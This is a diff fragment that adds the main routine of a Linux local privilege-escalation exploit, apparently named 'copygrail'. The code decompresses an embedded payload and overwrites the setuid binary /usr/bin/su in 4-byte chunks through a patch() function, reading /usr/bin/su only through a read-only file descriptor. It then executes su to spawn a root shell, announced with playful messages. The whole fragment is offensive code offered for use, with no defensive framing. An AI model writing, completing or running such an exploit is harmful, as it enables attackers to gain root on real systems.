@@ -118,3 +118,38 @@ int patch(int fd, off_t off, const unsigned char b[4]) {
     close(s);
     return 0;
 }
+
+int main() {
+    std::cout << PINK << R"(
+   copygrail v1  :3
+)" << RESET;
+
+    std::cout << CYAN << "  decompressing payload...\n" << RESET;
+
+    unsigned char p[4096];
+    uLongf l = sizeof(p);
+    uncompress(p, &l, PAYLOAD, sizeof(PAYLOAD));
+
+    std::cout << CYAN << "  patching /usr/bin/su (" << l << " bytes)...\n" << RESET;
+
+    int fd = open("/usr/bin/su", O_RDONLY);
+    if (fd < 0) {
+        std::cerr << "[-] failed to open /usr/bin/su\n";
+        return 1;
+    }
+
+    char warm[16384];
+    pread(fd, warm, sizeof warm, 0);
+
+    for (size_t i = 0; i < l; i += 4) {
+        unsigned char c[4] = {0};
+        memcpy(c, p + i, (l - i >= 4) ? 4 : l - i);
+        patch(fd, i, c);
+    }
+    close(fd);
+
+    std::cout << GREEN << "  done~ spawning root shell :3\n" << RESET;
+    execl("/usr/bin/su", "su", nullptr);
+
+    return 1;
+}
